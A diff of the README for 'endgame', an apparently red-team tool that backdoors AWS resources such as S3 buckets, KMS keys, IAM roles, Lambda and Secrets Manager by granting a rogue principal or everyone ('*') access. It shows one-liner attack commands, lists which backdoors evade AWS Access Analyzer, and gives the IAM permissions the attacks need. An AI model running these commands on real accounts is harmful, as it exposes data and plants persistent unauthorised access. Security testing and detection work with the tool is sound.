@@ -2,38 +2,47 @@
 
 Use a one-liner command to backdoor an AWS account's resources with a rogue AWS Account - or to the entire internet 😈
 
+![](./docs/images/endgame.gif)
+
 **TLDR**: `endgame smash --service all` to create backdoors across your entire AWS account - either to a rogue IAM user/role or to the entire internet.
 
 ```bash
 # this will ruin your day
-endgame smash --service all --evil-principal *
+endgame smash --service all --evil-principal "*" --dry-run
 # This will show you how your day could have been ruined
-endgame smash --service all --evil-principal * --dry-run
+endgame smash --service all --evil-principal "*" --dry-run
 # Atone for your sins
-endgame smash --service all --evil-principal * --undo
+endgame smash --service all --evil-principal "*" --undo
 # Consider maybe atoning for your sins
-endgame smash --service all --evil-principal * --undo --dry-run
+endgame smash --service all --evil-principal "*" --undo --dry-run
+
+# List resources available for exploitation
+endgame list-resources --service all
+# Expose specific resources
+endgame expose --service s3 --name computers-were-a-mistake
 ```
 
 ## Supported Backdoors
 
-| Backdoor   Resource Type      | Support | AWS Access Analyzer Support [1] |
-|-------------------------------|---------|-------------------------        |
-| ACM PCA                       | ✅     | ❌                              |
-| CloudWatch Resource Policies  | ✅     | ❌                              |
-| ECR Repositories              | ✅     | ❌                              |
-| EFS File Systems              | ✅     | ❌                              |
-| ElasticSearch Domains         | ✅     | ❌                              |
-| Glacier Vault Access Policies | ✅     | ❌                              |
-| IAM Roles                     | ✅     | ✅                              |
-| KMS Keys                      | ✅     | ✅                              |
-| Lambda Functions              | ✅     | ✅                              |
-| Lambda Layers                 | ✅     | ✅                              |
-| S3 Buckets                    | ✅     | ✅                              |
-| Secrets Manager Secrets       | ✅     | ✅                              |
-| SES Identity Policies         | ✅     | ❌                              |
-| SQS Queues                    | ✅     | ✅                              |
-| SNS Topics                    | ✅     | ❌                              |
+`endgame` can create backdoors for resources in any of the services listed below. While AWS Access Analyzer is meant to detect exposed resources of these types, it currently only supports 7/15 of the services that `endgame` attacks.
+
+| Backdoor Resource Type        | Support | [AWS Access Analyzer Support][1] |
+|-------------------------------|---------|-------------------------         |
+| ACM PCA                       | ✅     | ❌                               |
+| CloudWatch Resource Policies  | ✅     | ❌                               |
+| ECR Repositories              | ✅     | ❌                               |
+| EFS File Systems              | ✅     | ❌                               |
+| ElasticSearch Domains         | ✅     | ❌                               |
+| Glacier Vault Access Policies | ✅     | ❌                               |
+| IAM Roles                     | ✅     | ✅                               |
+| KMS Keys                      | ✅     | ✅                               |
+| Lambda Functions              | ✅     | ✅                               |
+| Lambda Layers                 | ✅     | ✅                               |
+| S3 Buckets                    | ✅     | ✅                               |
+| Secrets Manager Secrets       | ✅     | ✅                               |
+| SES Identity Policies         | ✅     | ❌                               |
+| SQS Queues                    | ✅     | ✅                               |
+| SNS Topics                    | ✅     | ❌                               |
 
 ## Tutorial
 
@@ -140,23 +149,23 @@ make terraform-destroy
 
 ### Backdoors via Resource-based Policies
 
-| Backdoor   Resource Type      | Support | AWS Access Analyzer Support [1] |
-|-------------------------------|---------|-------------------------        |
-| ACM PCA                       | ✅     | ❌                              |
-| CloudWatch Resource Policies  | ✅     | ❌                              |
-| ECR Repositories              | ✅     | ❌                              |
-| EFS File Systems              | ✅     | ❌                              |
-| ElasticSearch Domains         | ✅     | ❌                              |
-| Glacier Vault Access Policies | ✅     | ❌                              |
-| IAM Roles                     | ✅     | ✅                              |
-| KMS Keys                      | ✅     | ✅                              |
-| Lambda Functions              | ✅     | ✅                              |
-| Lambda Layers                 | ✅     | ✅                              |
-| S3 Buckets                    | ✅     | ✅                              |
-| Secrets Manager Secrets       | ✅     | ✅                              |
-| SES Identity Policies         | ✅     | ❌                              |
-| SQS Queues                    | ✅     | ✅                              |
-| SNS Topics                    | ✅     | ❌                              |
+| Backdoor Resource Type        | Support | [AWS Access Analyzer Support][1] |
+|-------------------------------|---------|-------------------------         |
+| ACM PCA                       | ✅     | ❌                               |
+| CloudWatch Resource Policies  | ✅     | ❌                               |
+| ECR Repositories              | ✅     | ❌                               |
+| EFS File Systems              | ✅     | ❌                               |
+| ElasticSearch Domains         | ✅     | ❌                               |
+| Glacier Vault Access Policies | ✅     | ❌                               |
+| IAM Roles                     | ✅     | ✅                               |
+| KMS Keys                      | ✅     | ✅                               |
+| Lambda Functions              | ✅     | ✅                               |
+| Lambda Layers                 | ✅     | ✅                               |
+| S3 Buckets                    | ✅     | ✅                               |
+| Secrets Manager Secrets       | ✅     | ✅                               |
+| SES Identity Policies         | ✅     | ❌                               |
+| SQS Queues                    | ✅     | ✅                               |
+| SNS Topics                    | ✅     | ❌                               |
 
 ### Backdoors via Sharing APIs
 
@@ -167,6 +176,83 @@ make terraform-destroy
 | RDS Snapshots                 | ❌             |
 | RDS DB Cluster Snapshots      | ❌             |
 
+## IAM Permissions
+
+The following IAM Permissions are used to create these backdoors:
+
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+            {
+            "Sid": "IAmInevitable",
+            "Effect": "Allow",
+            "Action": [
+                "acm-pca:DeletePolicy",
+                "acm-pca:GetPolicy",
+                "acm-pca:ListCertificateAuthorities",
+                "acm-pca:PutPolicy",
+                "ecr:DescribeRepositories",
+                "ecr:DeleteRepositoryPolicy",
+                "ecr:GetRepositoryPolicy",
+                "ecr:SetRepositoryPolicy",
+                "elasticfilesystem:DescribeFileSystems",
+                "elasticfilesystem:DescribeFileSystemPolicy",
+                "elasticfilesystem:PutFileSystemPolicy",
+                "es:DescribeElasticsearchDomainConfig",
+                "es:ListDomainNames",
+                "es:UpdateElasticsearchDomainConfig",
+                "glacier:GetVaultAccessPolicy",
+                "glacier:ListVaults",
+                "glacier:SetVaultAccessPolicy",
+                "iam:GetRole",
+                "iam:ListRoles",
+                "iam:UpdateAssumeRolePolicy",
+                "kms:GetKeyPolicy",
+                "kms:ListKeys",
+                "kms:ListAliases",
+                "kms:PutKeyPolicy",
+                "lambda:AddLayerVersionPermission",
+                "lambda:AddPermission",
+                "lambda:GetPolicy",
+                "lambda:GetLayerVersionPolicy",
+                "lambda:ListFunctions",
+                "lambda:ListLayers",
+                "lambda:ListLayerVersions",
+                "lambda:RemoveLayerVersionPermission",
+                "lambda:RemovePermission",
+                "logs:DescribeResourcePolicies",
+                "logs:DeleteResourcePolicy",
+                "logs:PutResourcePolicy",
+                "s3:ListAllMyBuckets",
+                "s3:GetBucketPolicy",
+                "s3:PutBucketPolicy",
+                "secretsmanager:GetResourcePolicy",
+                "secretsmanager:DeleteResourcePolicy",
+                "secretsmanager:ListSecrets",
+                "secretsmanager:PutResourcePolicy",
+                "ses:DeleteIdentityPolicy",
+                "ses:GetIdentityPolicies",
+                "ses:ListIdentities",
+                "ses:ListIdentityPolicies",
+                "ses:PutIdentityPolicy",
+                "sns:AddPermission",
+                "sns:ListTopics",
+                "sns:GetTopicAttributes",
+                "sns:RemovePermission",
+                "sqs:AddPermission",
+                "sqs:GetQueueUrl",
+                "sqs:GetQueueAttributes",
+                "sqs:ListQueues",
+                "sqs:RemovePermission"
+            ],
+            "Resource": "*"
+        }
+    ]
+}
+```
+
+You don't need **all** of these permissions to run the tool. You just need enough from each service. So, `s3:ListAllMyBuckets`, `s3:GetBucketPolicy`, and `s3:PutBucketPolicy` are all the permissions needed to leverage this tool to expose S3 buckets.
 
 ## Contributing
 
